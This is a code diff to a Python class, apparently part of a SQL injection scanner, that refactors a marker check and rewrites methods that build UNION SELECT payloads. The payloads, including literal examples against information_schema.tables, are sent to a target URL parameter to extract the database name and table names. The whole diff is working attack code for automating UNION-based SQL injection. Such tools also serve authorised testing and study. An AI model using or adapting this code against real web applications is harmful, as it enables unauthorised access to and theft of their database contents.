@@ -1,7 +1,7 @@
-from core.requester import HttpResponse, Requester
-from core.analyzer import Analyzer
+from core.Requester import HttpResponse, Requester
+from core.Analyzer import Analyzer
 from utils.constants import InjectionContext, differ_length_col_count, diff_marker
-from utils.logger import Logger
+from utils.Logger import Logger
 
 
 class UnionInjector:
@@ -65,8 +65,50 @@ class UnionInjector:
 
 		return None
 
-	def test_db_name(self, url: str, param: str) -> str:
-		payload = "' UNION SELECT database() -- "
+	def test_marker(self, url: str, param: str, ctx: InjectionContext, column_count) -> bool:
+		"""
+		Check if the marker we inject in the SQL query is printed back
+		in the response body. This would prove that the table names used in
+  		the query are leaked in the HTML.
+  		"""
+
+		# Create a marker list matching the number of columns to make query compatible.
+		nulls = ",".join([diff_marker] * (column_count))
+
+		payload = (
+			f"{ctx.prefix}UNION SELECT {nulls}{ctx.suffix}"
+		)
+		# Logger.debug(payload)
+
+		response = self.requester.send(
+			url,
+			{param: payload}
+		)
+
+		# Logger.debug(response.body)
+		if diff_marker not in response.body:
+			return False
+		return True
+
+	def test_db_name(
+     	self, url: str, param: str, ctx: InjectionContext, column_count: int
+    ) -> str | None:
+		"""
+		Test UNION injection to check if we can retrieve the database name
+  		"""
+  
+		# Check if the marker we inject in the SQL query is printed back in the response body.
+		if not self.test_marker(url, param, ctx, column_count):
+			return None
+  
+		"""
+		Now that we know the injection works we will get the real table names
+  		"""
+  
+		# Create a NULL list matching the number of columns to make query compatible.
+		# We substract 1 from count because the main element is added afterwards 
+		nulls = ",".join(["NULL"] * (column_count - 1))
+		payload = f"{ctx.prefix}UNION SELECT database(),{nulls}{ctx.suffix}"
 
 		response = self.requester.send(
 			url,
@@ -81,29 +123,8 @@ class UnionInjector:
 		Test UNION injection to check if we can retrieve table names
   		"""
 
-		"""
-		First, check if the marker we inject in the SQL query is printed back
-		in the response body. This would prove that the table names used in
-  		the query are leaked in the HTML.
-  		"""
-
-		# Create a marker list matching the number of columns to make query compatible.
-		nulls = ",".join([diff_marker] * (column_count))
-
-		payload = (
-			f"{ctx.prefix}UNION SELECT {nulls} FROM information_schema.tables{ctx.suffix}"
-			#"1 UNION SELECT table_name,null FROM information_schema.tables"
-			#"1' UNION SELECT table_name,null FROM information_schema.tables -- -"
-		)
-		# Logger.debug(payload)
-
-		response = self.requester.send(
-			url,
-			{param: payload}
-		)
-
-		# Logger.debug(response.body)
-		if diff_marker not in response.body:
+		# Check if the marker we inject in the SQL query is printed back in the response body.
+		if not self.test_marker(url, param, ctx, column_count):
 			return None
   
 		"""
@@ -111,7 +132,7 @@ class UnionInjector:
   		"""
   
   		# Create a NULL list matching the number of columns to make query compatible.
-		# We substract 1 from count because the main element is added afterwards 
+		# We substract 1 from count because the main element is added afterwards.
 		nulls = ",".join(["NULL"] * (column_count - 1))
 	
 		payload = (
